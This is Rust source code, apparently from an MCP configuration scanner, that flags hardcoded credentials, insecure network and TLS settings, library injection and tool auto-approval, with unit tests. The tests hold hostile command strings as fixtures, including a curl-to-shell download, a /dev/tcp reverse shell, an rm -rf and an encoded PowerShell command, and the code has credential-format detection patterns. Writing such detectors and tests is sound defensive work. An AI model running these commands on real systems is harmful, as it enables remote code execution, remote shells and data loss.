    if t.starts_with("github_pat_") && len >= 40 {
        return Some("GitHub token");
    }
    if ["ghp_", "gho_", "ghu_", "ghs_", "ghr_"]
        .iter()
        .any(|p| t.starts_with(*p))
        && len >= 36
    {
        return Some("GitHub token");
    }
    if t.starts_with("sk-ant-") && len >= 30 {
        return Some("Anthropic API key");
    }
    if t.starts_with("sk-")
        && len >= 32
        && tokenish
        && t.chars().any(|c| c.is_ascii_digit())
    {
        return Some("API key");
    }
    if t.starts_with("xox")
        && len >= 20
        && matches!(bytes.get(3), Some(b'b' | b'p' | b'a' | b'r' | b's'))
        && bytes.get(4) == Some(&b'-')
    {
        return Some("Slack token");
    }
    if t.starts_with("xapp-") && len >= 20 {
        return Some("Slack token");
    }
    if (t.starts_with("AKIA") || t.starts_with("ASIA"))
        && len == 20
        && t.chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
    {
        return Some("AWS access key ID");
    }
    if t.starts_with("AIza") && len == 39 && tokenish {
        return Some("Google API key");
    }
    if t.starts_with("glpat-") && len >= 26 {
        return Some("GitLab token");
    }
    if t.starts_with("npm_") && len >= 36 {
        return Some("npm token");
    }
    if t.starts_with("pypi-") && len >= 40 {
        return Some("PyPI token");
    }
    if (t.starts_with("sk_live_") || t.starts_with("rk_live_")) && len >= 24 {
        return Some("Stripe live key");
    }
    if t.starts_with("hf_") && len >= 34 && tokenish {
        return Some("Hugging Face token");
    }
    if t.starts_with("SG.") && len >= 40 {
        return Some("SendGrid key");
    }
    if t.starts_with("shpat_") && len >= 32 {
        return Some("Shopify token");
    }
    if t.starts_with("eyJ") && len >= 40 && t.matches('.').count() == 2 {
        return Some("JSON Web Token");
    }
    None
}

/// Decides whether `value` (optionally stored under `name`) looks like a
/// hardcoded credential. Values that reference an environment variable or look
/// like placeholders are ignored.
pub(crate) fn classify_secret(name: Option<&str>, value: &str) -> Option<SecretKind> {
    if value.contains("PRIVATE KEY-----") {
        return Some(SecretKind::Known("private key"));
    }
    let part = secret_part(value);
    if is_placeholder(part) || value.contains("${") {
        return None;
    }
    for token in value
        .split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.')))
        .filter(|t| !t.is_empty())
    {
        if let Some(kind) = known_token_kind(token) {
            return Some(SecretKind::Known(kind));
        }
    }
    if let Some(n) = name {
        if is_sensitive_name(n) && part.len() >= 4 && !looks_like_file_reference(part) {
            return Some(SecretKind::Named);
        }
    }
    None
}

/// Looks at free-form argument text: `NAME=value`, `Name: value`, or a bare token.
pub(crate) fn classify_arg_text(text: &str) -> Option<SecretKind> {
    if let Some((n, v)) = text.split_once('=') {
        if is_name_like(n) {
            if let Some(kind) = classify_secret(Some(n), v) {
                return Some(kind);
            }
        }
    }
    if let Some((n, v)) = text.split_once(':') {
        if is_name_like(n) && !v.starts_with("//") {
            if let Some(kind) = classify_secret(Some(n), v) {
                return Some(kind);
            }
        }
    }
    classify_secret(None, text)
}

pub(crate) fn secret_args(args: &[String]) -> Vec<SecretArg> {
    let mut found = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg.starts_with('-') {
            let flag = arg.trim_start_matches('-');
            if let Some(kind) = classify_arg_text(flag) {
                found.push(SecretArg {
                    index: i,
                    kind,
                    value_only: false,
                });
            } else if !flag.contains('=') && is_sensitive_name(flag) {
                if let Some(next) = args.get(i + 1) {
                    if !next.starts_with('-') {
                        if let Some(kind) = classify_secret(Some(flag), next) {
                            found.push(SecretArg {
                                index: i + 1,
                                kind,
                                value_only: true,
                            });
                            i += 1;
                        }
                    }
                }
            }
        } else if let Some(kind) = classify_arg_text(arg) {
            found.push(SecretArg {
                index: i,
                kind,
                value_only: false,
            });
        }
        i += 1;
    }
    found
}

pub(crate) struct ParsedUrl<'a> {
    pub scheme: &'a str,
    pub userinfo: Option<&'a str>,
    pub hostport: &'a str,
    pub host: String,
    pub path: &'a str,
    pub query: Option<&'a str>,
}

pub(crate) fn parse_url(url: &str) -> Option<ParsedUrl<'_>> {
    let (scheme, rest) = url.split_once("://")?;
    if scheme.is_empty()
        || !scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'))
    {
        return None;
    }
    let end = rest
        .find(|c: char| matches!(c, '/' | '?' | '#'))
        .unwrap_or(rest.len());
    let (authority, tail) = rest.split_at(end);
    let (userinfo, hostport) = match authority.rfind('@') {
        Some(p) => (Some(&authority[..p]), &authority[p + 1..]),
        None => (None, authority),
    };
    let host_raw = match hostport.strip_prefix('[') {
        Some(inner) => inner.split(']').next().unwrap_or(""),
        None => hostport.split(':').next().unwrap_or(""),
    };
    let host = host_raw.to_ascii_lowercase();
    let path = tail
        .split(|c: char| c == '?' || c == '#')
        .next()
        .unwrap_or("");
    let query = tail
        .split_once('?')
        .map(|(_, q)| q.split('#').next().unwrap_or(""));
    Some(ParsedUrl {
        scheme,
        userinfo,
        hostport,
        host,
        path,
        query,
    })
}

fn url_secrets(url: &str) -> Vec<SecretKind> {
    let Some(p) = parse_url(url) else {
        return Vec::new();
    };
    let mut kinds = Vec::new();
    if let Some(userinfo) = p.userinfo {
        match userinfo.split_once(':') {
            Some((_, password)) => {
                if !is_placeholder(password) {
                    kinds.push(SecretKind::Named);
                }
            }
            None => {
                if let Some(kind) = classify_secret(None, userinfo) {
                    kinds.push(kind);
                }
            }
        }
    }
    if let Some(query) = p.query {
        for pair in query.split('&') {
            if let Some((k, v)) = pair.split_once('=') {
                if let Some(kind) = classify_secret(Some(k), v) {
                    kinds.push(kind);
                }
            }
        }
    }
    kinds
}

fn secret_finding(s: &ServerConfig, field: String, kind: SecretKind, what: &str) -> Finding {
    let title = match kind {
        SecretKind::Known(k) => format!("Hardcoded {k} in {what}"),
        SecretKind::Named => format!("Hardcoded credential in {what}"),
    };
    Finding::new("MW-SEC-001", Severity::High, Confidence::Heuristic, s, field).describe(
        &title,
        "Secrets stored in a plain-text configuration file can leak through backups, screen sharing, accidental commits, or any process or agent that can read the file. This is a pattern match; MCPWatch has not verified that the value is a live credential, and it does not print the value.",
        "Reference the secret indirectly (an environment variable or your client's secret/input mechanism) instead of writing it into this file, and rotate the credential if the file has been shared or committed.",
    )
}

fn check_secrets(s: &ServerConfig, out: &mut Vec<Finding>) {
    for (name, value) in &s.env {
        if let Some(kind) = classify_secret(Some(name.as_str()), value) {
            out.push(secret_finding(
                s,
                format!("{}.{}", s.env_path, name),
                kind,
                "environment variable",
            ));
        }
    }
    for (name, value) in &s.headers {
        if let Some(kind) = classify_secret(Some(name.as_str()), value) {
            out.push(secret_finding(
                s,
                format!("{}.{}", s.headers_path, name),
                kind,
                "HTTP header",
            ));
        }
    }
    for found in secret_args(&s.args) {
        out.push(secret_finding(
            s,
            format!("{}[{}]", s.args_path, found.index),
            found.kind,
            "command-line argument",
        ));
    }
    if let (Some(url), Some(field)) = (s.url.as_deref(), s.url_path.as_deref()) {
        for kind in url_secrets(url) {
            out.push(secret_finding(s, field.to_string(), kind, "URL"));
        }
    }
    for (i, arg) in s.args.iter().enumerate() {
        let value = arg_value(arg);
        if value.contains("://") {
            for kind in url_secrets(value) {
                out.push(secret_finding(
                    s,
                    format!("{}[{}]", s.args_path, i),
                    kind,
                    "URL",
                ));
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Network
// ---------------------------------------------------------------------------

fn is_loopback(host: &str) -> bool {
    host == "localhost"
        || host == "::1"
        || host == "0:0:0:0:0:0:0:1"
        || host.starts_with("127.")
        || host.ends_with(".localhost")
}

fn is_tunnel_host(host: &str) -> bool {
    [
        ".ngrok.io",
        ".ngrok-free.app",
        ".ngrok.app",
        ".trycloudflare.com",
        ".loca.lt",
        ".serveo.net",
    ]
    .iter()
    .any(|suffix| host.ends_with(*suffix))
}

fn is_all_interfaces(value: &str) -> bool {
    let t = value
        .trim()
        .trim_start_matches("http://")
        .trim_start_matches("https://");
    t == "0.0.0.0"
        || t.starts_with("0.0.0.0:")
        || t.starts_with("0.0.0.0/")
        || t == "::"
        || t.starts_with("[::]")
        || t == "*"
        || t.starts_with("*:")
}

fn publishes_on_all_interfaces(spec: &str) -> bool {
    let spec = spec.split('/').next().unwrap_or(spec);
    if let Some(rest) = spec.strip_prefix('[') {
        return rest.split(']').next().unwrap_or("") == "::";
    }
    let parts: Vec<&str> = spec.split(':').collect();
    if parts.len() >= 3 {
        let ip = parts[0];
        return ip.is_empty() || ip == "0.0.0.0" || ip == "*";
    }
    true
}

fn check_url(
    s: &ServerConfig,
    url: &str,
    field: String,
    report_remote: bool,
    out: &mut Vec<Finding>,
) {
    let Some(p) = parse_url(url) else {
        return;
    };
    let scheme = p.scheme.to_ascii_lowercase();
    let plain = matches!(scheme.as_str(), "http" | "ws");
    let secure = matches!(scheme.as_str(), "https" | "wss");
    if (!plain && !secure) || p.host.is_empty() || is_loopback(&p.host) {
        return;
    }
    if plain {
        out.push(
            Finding::new(
                "MW-NET-001",
                Severity::Medium,
                Confidence::Observed,
                s,
                field.clone(),
            )
            .describe(
                &format!(
                    "Unencrypted {} connection to {}",
                    scheme.to_ascii_uppercase(),
                    p.host
                ),
                "Traffic to this endpoint, including tool data and any credentials sent with it, is not encrypted in transit and can be read or altered by anyone on the network path.",
                "Use https:// (or wss://), or a loopback address if the service runs on this machine.",
            ),
        );
    }
    if is_tunnel_host(&p.host) {
        out.push(
            Finding::new(
                "MW-NET-003",
                Severity::Low,
                Confidence::Heuristic,
                s,
                field,
            )
            .describe(
                &format!("Endpoint is hosted on a public tunneling service ({})", p.host),
                "Tunneling services expose a machine behind a public address. The operator of that machine is not identified by the URL, and the address may be temporary.",
                "Prefer an endpoint operated by a party you can identify, and confirm who controls this one.",
            ),
        );
    } else if secure && report_remote {
        out.push(
            Finding::new("MW-NET-002", Severity::Info, Confidence::Observed, s, field).describe(
                &format!("Connects to remote host {}", p.host),
                "Tool inputs and results are exchanged with a service outside this machine. MCPWatch cannot evaluate who operates it or how it handles data.",
                "Confirm that you trust the operator and that the address belongs to the service you expect.",
            ),
        );
    }
}

fn check_network(s: &ServerConfig, out: &mut Vec<Finding>) {
    if let (Some(url), Some(field)) = (s.url.as_deref(), s.url_path.as_deref()) {
        check_url(s, url, field.to_string(), true, out);
    }
    for (i, arg) in s.args.iter().enumerate() {
        let value = arg_value(arg);
        if value.contains("://") {
            let positional = !arg.starts_with('-') && (i == 0 || !s.args[i - 1].starts_with('-'));
            check_url(
                s,
                value,
                format!("{}[{}]", s.args_path, i),
                positional,
                out,
            );
        }
    }
    check_bind_all(s, out);
    check_container_publish(s, out);
    check_tls(s, out);
    check_proxy(s, out);
}

fn check_bind_all(s: &ServerConfig, out: &mut Vec<Finding>) {
    const FLAGS: &[&str] = &[
        "--host",
        "--hostname",
        "--bind",
        "--listen",
        "--address",
        "--bind-address",
        "--listen-address",
        "--interface",
    ];
    let report = |field: String, out: &mut Vec<Finding>| {
        out.push(
            Finding::new("MW-NET-004", Severity::Medium, Confidence::Heuristic, s, field)
                .describe(
                    "Service is configured to listen on all network interfaces",
                    "Listening on all interfaces can make the service reachable from other machines on the network, not only this computer, depending on firewall settings. MCPWatch cannot tell whether the service requires authentication.",
                    "Bind to 127.0.0.1 (loopback) unless remote access is intended and protected.",
                ),
        );
    };
    for i in 0..s.args.len() {
        if let Some((value, idx)) = flag_value(&s.args, i, FLAGS) {
            if is_all_interfaces(value) {
                report(format!("{}[{}]", s.args_path, idx), out);
            }
        } else if !s.args[i].starts_with('-') && s.args[i].starts_with("0.0.0.0") {
            report(format!("{}[{}]", s.args_path, i), out);
        }
    }
    for (key, value) in &s.env {
        let upper = key.to_ascii_uppercase();
        if matches!(
            upper.as_str(),
            "HOST" | "BIND" | "BIND_ADDRESS" | "LISTEN" | "LISTEN_ADDRESS" | "HOSTNAME" | "ADDRESS"
        ) && is_all_interfaces(value)
        {
            report(format!("{}.{}", s.env_path, key), out);
        }
    }
}

fn check_container_publish(s: &ServerConfig, out: &mut Vec<Finding>) {
    if !is_container_runtime(s) {
        return;
    }
    for i in 0..s.args.len() {
        let field = if let Some((spec, idx)) = flag_value(&s.args, i, &["-p", "--publish"]) {
            if publishes_on_all_interfaces(spec) {
                Some(format!("{}[{}]", s.args_path, idx))
            } else {
                None
            }
        } else if matches!(s.args[i].as_str(), "-P" | "--publish-all") {
            Some(format!("{}[{}]", s.args_path, i))
        } else {
            None
        };
        if let Some(field) = field {
            out.push(
                Finding::new("MW-NET-005", Severity::Medium, Confidence::Observed, s, field)
                    .describe(
                        "Container port is published on all host interfaces",
                        "Without an explicit address, published ports are reachable from other machines on the network, not only from this computer.",
                        "Publish to loopback only, for example `-p 127.0.0.1:3000:3000`.",
                    ),
            );
        }
    }
}

fn check_tls(s: &ServerConfig, out: &mut Vec<Finding>) {
    const TLS_FLAGS: &[&str] = &[
        "--insecure",
        "--no-verify-ssl",
        "--no-check-certificate",
        "--skip-tls-verify",
        "--insecure-skip-tls-verify",
        "--tls-skip-verify",
        "--disable-ssl-verification",
    ];
    for (i, arg) in s.args.iter().enumerate() {
        let lower = arg.to_ascii_lowercase();
        let (flag, value) = match lower.split_once('=') {
            Some((f, v)) => (f, Some(v)),
            None => (lower.as_str(), None),
        };
        let field = format!("{}[{}]", s.args_path, i);
        if TLS_FLAGS.contains(&flag) && !matches!(value, Some("false") | Some("0")) {
            out.push(
                Finding::new("MW-NET-006", Severity::Medium, Confidence::Heuristic, s, field)
                    .describe(
                        "Certificate verification appears to be disabled",
                        "Without certificate verification, a party on the network path can impersonate the server the client is talking to. The exact effect depends on the tool that receives this flag.",
                        "Remove the flag and, if needed, configure a trusted certificate authority instead.",
                    ),
            );
        } else if flag == "--allow-http" {
            out.push(
                Finding::new("MW-NET-001", Severity::Medium, Confidence::Heuristic, s, field)
                    .describe(
                        "Flag appears to permit unencrypted HTTP connections",
                        "Plain HTTP traffic can be read or altered on the network path. The exact behavior depends on the tool that receives this flag.",
                        "Use HTTPS endpoints and remove the flag.",
                    ),
            );
        }
    }
    for (key, value) in &s.env {
        let v = value.trim().to_ascii_lowercase();
        let disabled = match key.as_str() {
            "NODE_TLS_REJECT_UNAUTHORIZED" | "PYTHONHTTPSVERIFY" => v == "0",
            "GIT_SSL_NO_VERIFY" => v == "1" || v == "true",
            _ => false,
        };
        if disabled {
            out.push(
                Finding::new(
                    "MW-NET-006",
                    Severity::Medium,
                    Confidence::Observed,
                    s,
                    format!("{}.{}", s.env_path, key),
                )
                .describe(
                    "Certificate verification is disabled for the server process",
                    "Without certificate verification, a party on the network path can impersonate the services the process connects to.",
                    "Remove the variable and, if needed, configure a trusted certificate authority instead.",
                ),
            );
        }
    }
}

fn check_proxy(s: &ServerConfig, out: &mut Vec<Finding>) {
    for (key, value) in &s.env {
        if !matches!(
            key.to_ascii_uppercase().as_str(),
            "HTTP_PROXY" | "HTTPS_PROXY" | "ALL_PROXY"
        ) || is_placeholder(value)
        {
            continue;
        }
        let local = parse_url(value).is_some_and(|p| is_loopback(&p.host));
        if !local {
            out.push(
                Finding::new(
                    "MW-NET-007",
                    Severity::Info,
                    Confidence::Observed,
                    s,
                    format!("{}.{}", s.env_path, key),
                )
                .describe(
                    "Server traffic is routed through a proxy",
                    "A proxy can observe or modify the traffic that passes through it. This is common in corporate networks but worth confirming.",
                    "Confirm that you recognize and trust the proxy.",
                ),
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Environment and client settings
// ---------------------------------------------------------------------------

fn check_environment(s: &ServerConfig, out: &mut Vec<Finding>) {
    for (key, value) in &s.env {
        if matches!(key.as_str(), "LD_PRELOAD" | "DYLD_INSERT_LIBRARIES") && !is_placeholder(value)
        {
            out.push(
                Finding::new(
                    "MW-ENV-001",
                    Severity::Medium,
                    Confidence::Observed,
                    s,
                    format!("{}.{}", s.env_path, key),
                )
                .describe(
                    "Shared library is injected into the server process",
                    "Preloading a library lets that library run inside the server process and intercept its calls. It has legitimate uses, but it is also a common technique for tampering.",
                    "Remove the variable unless you placed the library there deliberately and trust its source.",
                ),
            );
        }
    }
}

fn check_auto_approval(s: &ServerConfig, out: &mut Vec<Finding>) {
    for key in ["autoApprove", "alwaysAllow", "auto_approve"] {
        let Some(value) = s.settings.get(key) else {
            continue;
        };
        let (severity, detail) = match value {
            Value::Array(items) if !items.is_empty() => {
                if items.iter().any(|i| i.as_str() == Some("*")) {
                    (Severity::High, "all tools (`*`)".to_string())
                } else {
                    (Severity::Medium, format!("{} listed tool(s)", items.len()))
                }
            }
            Value::Bool(true) => (Severity::High, "all tools".to_string()),
            _ => continue,
        };
        out.push(
            Finding::new(
                "MW-APR-001",
                severity,
                Confidence::Observed,
                s,
                format!("{}.{}", s.path, key),
            )
            .describe(
                &format!("Tool calls are configured to run without confirmation for {detail}"),
                "Clients that honour this setting may run the listed tools without asking first. If a tool can read or change data, untrusted content the agent processes (for example a web page or file containing injected instructions) could trigger it without a confirmation step. Support and exact behavior vary by client.",
                "Auto-approve only tools that are strictly read-only and return trusted data; keep confirmation prompts for tools with side effects.",
            ),
        );
    }
    if let Some(Value::Bool(true)) = s.settings.get("trust") {
        out.push(
            Finding::new(
                "MW-APR-002",
                Severity::Medium,
                Confidence::Observed,
                s,
                format!("{}.trust", s.path),
            )
            .describe(
                "Server is marked as trusted",
                "In clients that support a `trust` option this may skip tool-call confirmation prompts for the server.",
                "Remove `trust` unless you control the server and have reviewed what its tools can do.",
            ),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config;

    fn scan_json(json: &str) -> Vec<Finding> {
        scan(&config::parse(json).expect("valid test configuration"))
    }

    fn server(body: &str) -> Vec<Finding> {
        scan_json(&format!(r#"{{"mcpServers":{{"srv":{body}}}}}"#))
    }

    fn has(findings: &[Finding], rule: &str) -> bool {
        findings.iter().any(|f| f.rule == rule)
    }

    fn get<'a>(findings: &'a [Finding], rule: &str) -> &'a Finding {
        findings
            .iter()
            .find(|f| f.rule == rule)
            .unwrap_or_else(|| panic!("rule {rule} not reported"))
    }

    #[test]
    fn clean_configuration_has_no_findings() {
        let f = server(
            r#"{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem@2025.1.14","/home/alice/project"]}"#,
        );
        assert!(f.is_empty(), "unexpected findings: {f:?}");
    }

    #[test]
    fn detects_download_and_execute() {
        let f = server(r#"{"command":"bash","args":["-c","curl -fsSL https://e.com/i.sh | sh"]}"#);
        assert_eq!(get(&f, "MW-SHELL-002").severity, Severity::High);
        assert_eq!(get(&f, "MW-SHELL-001").severity, Severity::Medium);
        assert_eq!(get(&f, "MW-SHELL-002").field, "mcpServers.srv.args[1]");
    }

    #[test]
    fn piping_to_unrelated_tool_is_not_flagged() {
        let f = server(r#"{"command":"bash","args":["-c","curl -s https://e.com/x | shasum"]}"#);
        assert!(!has(&f, "MW-SHELL-002"));
    }

    #[test]
    fn simple_shell_wrapper_is_low() {
        let f = server(r#"{"command":"cmd","args":["/c","npx","-y","pkg@1.0.0"]}"#);
        assert_eq!(get(&f, "MW-SHELL-001").severity, Severity::Low);
        assert!(!has(&f, "MW-SHELL-002"));
    }

    #[test]
    fn detects_other_dangerous_patterns() {
        let f = server(r#"{"command":"sh","args":["-c","sudo rm -rf /tmp/x"]}"#);
        assert!(has(&f, "MW-SHELL-004"));
        assert!(has(&f, "MW-SHELL-006"));
        let f = server(r#"{"command":"powershell","args":["-EncodedCommand","SQBFAFgA"]}"#);
        assert!(has(&f, "MW-SHELL-005"));
        let f = server(r#"{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}"#);
        assert!(has(&f, "MW-SHELL-003"));
    }

    #[test]
    fn flags_unpinned_packages() {
        let f = server(r#"{"command":"npx","args":["-y","some-package"]}"#);
        assert_eq!(get(&f, "MW-PKG-001").field, "mcpServers.srv.args[1]");
        let f = server(r#"{"command":"npx","args":["-y","@scope/pkg@latest"]}"#);
        assert!(has(&f, "MW-PKG-001"));
        let f = server(r#"{"command":"uvx","args":["tool"]}"#);
        assert!(has(&f, "MW-PKG-001"));
        let f = server(r#"{"command":"uvx","args":["tool==1.2.3"]}"#);
        assert!(!has(&f, "MW-PKG-001"));
        let f = server(r#"{"command":"npx","args":["-y","@scope/pkg@1.2.3"]}"#);
        assert!(!has(&f, "MW-PKG-001"));
        let f = server(r#"{"command":"npx","args":["git+https://example.com/x.git"]}"#);
        assert_eq!(get(&f, "MW-PKG-002").severity, Severity::Medium);
    }

    #[test]
    fn flags_broad_filesystem_access() {
        let f = server(r#"{"command":"node","args":["s.js","/"]}"#);
        assert_eq!(get(&f, "MW-FS-001").severity, Severity::High);
        assert_eq!(get(&f, "MW-FS-001").field, "mcpServers.srv.args[1]");

        let f = server(r#"{"command":"node","args":["s.js","~"]}"#);
        assert_eq!(get(&f, "MW-FS-003").severity, Severity::Medium);

        let f = server(r#"{"command":"node","args":["s.js","/home/alice/.ssh"]}"#);
        assert_eq!(get(&f, "MW-FS-004").severity, Severity::High);

        let f = server(r#"{"command":"node","args":["s.js","/etc"]}"#);
        assert!(has(&f, "MW-FS-006"));

        let f = server(r#"{"command":"node","args":["s.js","/home"]}"#);
        assert!(has(&f, "MW-FS-002"));

        let f = server(r#"{"command":"node","args":["s.js","C:\\"]}"#);
        assert!(has(&f, "MW-FS-001"));

        let f = server(r#"{"command":"node","args":["s.js","--root=/usr"]}"#);
        assert!(has(&f, "MW-FS-007"));

        let f = server(r#"{"command":"node","args":["s.js","/home/alice/project","./relative"]}"#);
        assert!(f.is_empty());
    }

    #[test]
    fn flags_filesystem_access_through_env() {
        let f = server(r#"{"command":"node","env":{"ALLOWED_DIRECTORIES":"/"}}"#);
        assert_eq!(get(&f, "MW-FS-001").field, "mcpServers.srv.env.ALLOWED_DIRECTORIES");
    }

    #[test]
    fn container_mounts_and_options() {
        let f = server(r#"{"command":"docker","args":["run","-i","--rm","-v","/:/host","img"]}"#);
        assert_eq!(get(&f, "MW-FS-001").severity, Severity::High);
        assert_eq!(get(&f, "MW-FS-001").field, "mcpServers.srv.args[4]");

        let f = server(r#"{"command":"docker","args":["run","-v","/:/host:ro","img"]}"#);
        assert_eq!(get(&f, "MW-FS-001").severity, Severity::Medium);

        let f = server(r#"{"command":"docker","args":["run","--mount","type=bind,source=/etc,target=/e","img"]}"#);
        assert!(has(&f, "MW-FS-006"));

        let f = server(r#"{"command":"docker","args":["run","-v","/var/run/docker.sock:/var/run/docker.sock","img"]}"#);
        assert!(has(&f, "MW-FS-005"));

        let f = server(r#"{"command":"docker","args":["run","-v","myvolume:/data","img"]}"#);
        assert!(f.is_empty());

        let f = server(r#"{"command":"docker","args":["run","--privileged","--network","host","--cap-add=SYS_ADMIN","--security-opt","seccomp=unconfined","img"]}"#);
        assert!(has(&f, "MW-CONT-001"));
        assert!(has(&f, "MW-CONT-002"));
        assert!(has(&f, "MW-CONT-003"));
        assert!(has(&f, "MW-CONT-004"));
    }

    #[test]
    fn detects_named_secrets_without_leaking_them() {
        let secret = "s3cr3t-value-123";
        let f = server(&format!(
            r#"{{"command":"node","env":{{"API_TOKEN":"{secret}"}}}}"#
        ));
        let finding = get(&f, "MW-SEC-001");
        assert_eq!(finding.severity, Severity::High);
        assert_eq!(finding.field, "mcpServers.srv.env.API_TOKEN");
        let text = format!(
            "{} {} {} {} {}",
            finding.title, finding.why, finding.fix, finding.field, finding.server
        );
        assert!(!text.contains(secret));
    }

    #[test]
    fn detects_known_token_formats() {
        let token = format!("ghp_{}", "a".repeat(36));
        let f = server(&format!(r#"{{"command":"node","env":{{"FOO":"{token}"}}}}"#));
        let finding = get(&f, "MW-SEC-001");
        assert!(finding.title.contains("GitHub token"));
        assert!(!finding.title.contains(&token));

        let aws = format!("AKIA{}", "A".repeat(16));
        let f = server(&format!(r#"{{"command":"node","args":["--cfg","{aws}"]}}"#));
        assert!(has(&f, "MW-SEC-001"));
    }

    #[test]
    fn ignores_placeholders_and_references() {
        for value in ["${API_TOKEN}", "$API_TOKEN", "%API_TOKEN%", "<your-token>", "", "true", "xxxxxxxx", "your_token_here"] {
            let f = server(&format!(
                r#"{{"command":"node","env":{{"API_TOKEN":"{value}"}}}}"#
            ));
            assert!(!has(&f, "MW-SEC-001"), "value {value:?} should not be flagged");
        }
        let f = server(r#"{"command":"node","env":{"TOKEN_FILE":"/run/secrets/t","MAX_TOKENS":"4096"}}"#);
        assert!(!has(&f, "MW-SEC-001"));
        let f = server(r#"{"command":"node","env":{"GOOGLE_APPLICATION_CREDENTIALS":"/home/a/key.json"}}"#);
        assert!(!has(&f, "MW-SEC-001"));
    }

    #[test]
    fn detects_secrets_in_args_headers_and_urls() {
        let f = server(r#"{"command":"node","args":["s.js","--api-key","abcdef123456"]}"#);
        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.args[2]");

        let f = server(r#"{"command":"node","args":["--password=hunter2hunter2"]}"#);
        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.args[0]");

        let f = server(r#"{"command":"docker","args":["run","-e","GITHUB_TOKEN=abcdef123456","img"]}"#);
        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.args[2]");

        let f = server(r#"{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer abcdef123456"}}"#);
        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.headers.Authorization");

        let f = server(r#"{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer ${TOKEN}"}}"#);
        assert!(!has(&f, "MW-SEC-001"));

        let f = server(r#"{"command":"node","args":["postgresql://user:hunter2pw@localhost/db"]}"#);
        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.args[0]");

        let f = server(r#"{"url":"https://example.com/mcp?api_key=abcdef123456"}"#);
        assert_eq!(get(&f, "MW-SEC-001").field, "mcpServers.srv.url");
    }

    #[test]
    fn flags_risky_network_settings() {
        let f = server(r#"{"url":"http://example.com/mcp"}"#);
        assert_eq!(get(&f, "MW-NET-001").severity, Severity::Medium);

        let f = server(r#"{"url":"http://localhost:8080/mcp"}"#);
        assert!(f.is_empty());

        let f = server(r#"{"url":"https://example.com/mcp"}"#);
        assert_eq!(get(&f, "MW-NET-002").severity, Severity::Info);

        let f = server(r#"{"url":"https://abc.ngrok-free.app/mcp"}"#);
        assert!(has(&f, "MW-NET-003"));

        let f = server(r#"{"command":"node","args":["s.js","--host","0.0.0.0"]}"#);
        assert!(has(&f, "MW-NET-004"));

        let f = server(r#"{"command":"node","env":{"HOST":"0.0.0.0"}}"#);
        assert!(has(&f, "MW-NET-004"));

        let f = server(r#"{"command":"docker","args":["run","-p","3000:3000","img"]}"#);
        assert!(has(&f, "MW-NET-005"));
        let f = server(r#"{"command":"docker","args":["run","-p","127.0.0.1:3000:3000","img"]}"#);
        assert!(!has(&f, "MW-NET-005"));

        let f = server(r#"{"command":"node","args":["s.js","--insecure"],"env":{"NODE_TLS_REJECT_UNAUTHORIZED":"0"}}"#);
        assert_eq!(f.iter().filter(|x| x.rule == "MW-NET-006").count(), 2);

        let f = server(r#"{"command":"npx","args":["mcp-remote@1.0.0","https://example.com/mcp","--allow-http"]}"#);
        assert!(has(&f, "MW-NET-001"));
    }

    #[test]
    fn flags_injected_libraries_and_proxies() {
        let f = server(r#"{"command":"node","env":{"LD_PRELOAD":"/tmp/x.so"}}"#);
        assert!(has(&f, "MW-ENV-001"));
        let f = server(r#"{"command":"node","env":{"HTTPS_PROXY":"http://proxy.example.net:3128"}}"#);
        assert_eq!(get(&f, "MW-NET-007").severity, Severity::Info);
    }

    #[test]
    fn flags_auto_approval() {
        let f = server(r#"{"command":"node","autoApprove":["*"]}"#);
        assert_eq!(get(&f, "MW-APR-001").severity, Severity::High);
        let f = server(r#"{"command":"node","alwaysAllow":["read_file"]}"#);
        assert_eq!(get(&f, "MW-APR-001").severity, Severity::Medium);
        let f = server(r#"{"command":"node","autoApprove":[]}"#);
        assert!(!has(&f, "MW-APR-001"));
        let f = server(r#"{"command":"node","trust":true}"#);
        assert!(has(&f, "MW-APR-002"));
    }

    #[test]
    fn reports_malformed_fields_as_findings() {
        let f = server(r#"{"command":42}"#);
        assert_eq!(get(&f, "MW-CFG-001").field, "mcpServers.srv.command");
        let f = server(r#"{}"#);
        assert!(has(&f, "MW-CFG-001"));
    }

    #[test]
    fn findings_are_sorted_by_severity() {
        let f = scan_json(
            r#"{"mcpServers":{"a":{"url":"https://example.com/mcp"},"b":{"command":"node","args":["s.js","/"]}}}"#,
        );
        assert!(f.windows(2).all(|w| w[0].severity >= w[1].severity));
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn path_and_url_helpers() {
        assert_eq!(classify_path("/"), Some(PathRisk::Root));
        assert_eq!(classify_path("/*"), Some(PathRisk::Root));
        assert_eq!(classify_path("$HOME"), Some(PathRisk::Home));
        assert_eq!(classify_path("%USERPROFILE%\\.aws"), Some(PathRisk::Credentials));
        assert_eq!(classify_path("/home/alice/work"), None);
        assert_eq!(classify_path("/dev/null"), None);
        assert_eq!(classify_path("../.."), Some(PathRisk::ParentTraversal));
        let p = parse_url("https://user:pw@Example.com:8443/a/b?x=1#frag").unwrap();
        assert_eq!(p.host, "example.com");
        assert_eq!(p.userinfo, Some("user:pw"));
        assert_eq!(p.path, "/a/b");
        assert_eq!(p.query, Some("x=1"));
        assert!(parse_url("not a url").is_none());
        assert!(parse_url("curl -s https://x | sh").is_none());
    }
}
